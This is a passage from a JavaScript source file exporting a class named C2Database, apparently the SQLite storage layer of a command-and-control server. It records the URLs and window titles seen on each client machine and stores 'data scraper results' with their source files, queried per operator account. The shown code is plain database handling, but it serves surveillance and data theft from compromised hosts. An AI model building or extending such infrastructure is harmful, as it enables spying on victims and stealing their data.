        if (!timestamp) timestamp = Date.now();
        // Check if this URL already exists for this client
        const existing = this.db.prepare(
            'SELECT id FROM urls WHERE client_id = ? AND url = ?'
        ).get(clientId, url);
        
        if (existing) {
            // Update last_seen
            this.db.prepare('UPDATE urls SET last_seen = ?, window_title = ? WHERE id = ?')
                .run(timestamp, windowTitle, existing.id);
            return { action: 'updated', id: existing.id };
        }
        
        // New URL
        this.db.prepare(`
            INSERT INTO urls (client_id, url, window_title, first_seen, last_seen)
            VALUES (?, ?, ?, ?, ?)
        `).run(clientId, url, windowTitle, timestamp, timestamp);
        
        return { action: 'inserted', id: this.db.lastInsertRowid };
    }
    
    // Scanned data operations (data scraper results)
    addScannedData(clientId, dataType, dataValue, sourceFile = '') {
        const stmt = this.db.prepare(`
            INSERT INTO scanned_data (client_id, data_type, data_value, source_file, created_at)
            VALUES (?, ?, ?, ?, strftime('%s', 'now'))
        `);
        return stmt.run(clientId, dataType, dataValue, sourceFile);
    }

    getScannedData(clientId, limit = 100, offset = 0, userId = null) {
        if (userId !== null) {
            return this.db.prepare(`
                SELECT sd.*
                FROM scanned_data sd
                JOIN clients c ON c.id = sd.client_id
                WHERE sd.client_id = ? AND c.user_id = ?
                ORDER BY sd.created_at DESC
                LIMIT ? OFFSET ?
            `).all(clientId, userId, limit, offset);
        }
        return this.db.prepare(`
            SELECT * FROM scanned_data
            WHERE client_id = ?
            ORDER BY created_at DESC
            LIMIT ? OFFSET ?
        `).all(clientId, limit, offset);
    }

    getAllScannedData(limit = 500, offset = 0, userId = null) {
        if (userId !== null) {
            return this.db.prepare(`
                SELECT sd.*, c.hostname as client_hostname, c.username as client_username
                FROM scanned_data sd
                JOIN clients c ON c.id = sd.client_id
                WHERE c.user_id = ?
                ORDER BY sd.created_at DESC
                LIMIT ? OFFSET ?
            `).all(userId, limit, offset);
        }
        return this.db.prepare(`
            SELECT sd.*, c.hostname as client_hostname, c.username as client_username
            FROM scanned_data sd
            JOIN clients c ON c.id = sd.client_id
            ORDER BY sd.created_at DESC
            LIMIT ? OFFSET ?
        `).all(limit, offset);
    }

    deleteScannedData(id, userId = null) {
        if (userId !== null) {
            return this.db.prepare(`
                DELETE FROM scanned_data
                WHERE id = ? AND client_id IN (SELECT id FROM clients WHERE user_id = ?)
            `).run(id, userId);
        }
        return this.db.prepare('DELETE FROM scanned_data WHERE id = ?').run(id);
    }

    deleteAllScannedData(userId = null) {
        if (userId !== null) {
            return this.db.prepare(`
                DELETE FROM scanned_data
                WHERE client_id IN (SELECT id FROM clients WHERE user_id = ?)
            `).run(userId);
        }
        return this.db.prepare('DELETE FROM scanned_data').run();
    }

    close() {
        this.db.close();
    }
}

module.exports = C2Database;
